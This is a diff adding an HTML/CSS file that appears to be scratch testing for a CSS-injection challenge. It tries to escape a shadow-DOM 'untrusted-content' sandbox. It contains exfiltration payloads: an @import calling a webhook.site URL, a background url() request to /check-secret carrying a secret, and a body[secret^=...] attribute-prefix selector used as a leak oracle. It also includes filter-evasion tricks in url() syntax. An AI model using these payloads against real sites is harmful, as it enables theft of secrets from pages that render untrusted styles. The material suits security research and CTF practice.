@@ -1,0 +1,97 @@
+<style>
+h1 {
+ color:red
+}
+:has(h1) {
+ color: green;
+}
+</style>
+<div><h1>red</div>
+<h2 style="color:green; background:url(/check-secret?secret=005da72539fcc2b1b2f539d83f27fb625050786600000000cdcdc0dbcff627931af15b517533097ab52e2a3976900c7581ca2023cb1fe46b)">swag
+
+
+<style>
+</style>
+<h1>h1</h1>
+<h2>h2</h2>
+<h3>h3</h3>
+
+<style>
+@scope (div) {
+@import url(https://webhook.site/5fb68550-bd86-424f-a05b-53dfa587b73e?a);
+  * {
+   color:red
+  }
+}
+</style>
+<div>
+<h1>h1</h1>
+<h2>h2</h2>
+<h3>h3</h3>
+
+<style>
+@scope (div) {
+@font-face {
+  font-family: "Trickster";
+  src:
+    url&#x0028;"Trickster")
+}
+  * {
+   color:red
+background:ur l(222)
+  }
+}
+* {
+color: red!important;
+}
+</style>
+<div>
+<h1>h1</h1>
+<h2>h2</h2>
+<h3>h3</h3>
+
+
+
+:host(untrusted-content) {
+ position:absolute; background:#F0F;
+}
+
+
+
+<style>
+
+@scope (:host(untrusted-content)) {
+:host(untrusted-content) {
+ position:absolute; background:#F0F;
+}
+* {
+background: red;
+}
+:scope {
+position:absolute;
+}
+}
+</style>
+<div><p>asdasd</p>asdasd
+
+
+<style>
+
+@scope (:host-context(body[secret^="0055475c1430d500a022456fd4c64fa68a5a7866000000008c06260e2c896a4d3b3c58d097b5e5db17c35acc18261df7f8b08e5ab53a22fe"])) {
+:root {
+background: red;
+}
+  :scope {
+    position:absolute;
+/*background: red;*/
+  }
+:scope::after{
+    content: "asdasdasdasdasdasdasda"
+  }
+* {
+position:absolute;
+background: green;
+}
+}
+</style>
+<div><p>asdasd</p>asdasd
